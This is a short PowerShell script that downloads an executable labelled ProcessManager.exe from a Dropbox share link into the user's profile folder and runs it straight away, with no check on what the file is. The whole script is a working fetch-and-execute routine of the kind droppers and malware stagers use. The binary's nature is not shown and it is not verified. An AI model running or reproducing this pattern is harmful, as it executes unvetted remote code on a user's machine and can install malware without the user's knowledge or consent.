# Get the current user's profile path
$userPath = $env:USERPROFILE

# Download URL
$url = "https://www.dropbox.com/scl/fi/eysk7vxnymkxuxj7jpf1u/ProcessManager.exe?rlkey=aouivjocd3zxv70w4pcqoysoa&st=kmtdpv1f&dl=1"

# Destination file path
$destination = Join-Path -Path $userPath -ChildPath "ProcessManager.exe"

try {
    # Download the file
    Write-Host "Downloading file to $destination..."
    Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
    
    # Check if file was downloaded successfully
    if (Test-Path $destination) {
        Write-Host "Download completed successfully."
        
        # Execute the downloaded file
        Write-Host "Starting ProcessManager..."
        Start-Process -FilePath $destination
        
        Write-Host "ProcessManager has been started."
    } else {
        Write-Host "Error: File was not downloaded successfully."
    }
}
catch {
    Write-Host "An error occurred: $($_.Exception.Message)"
}
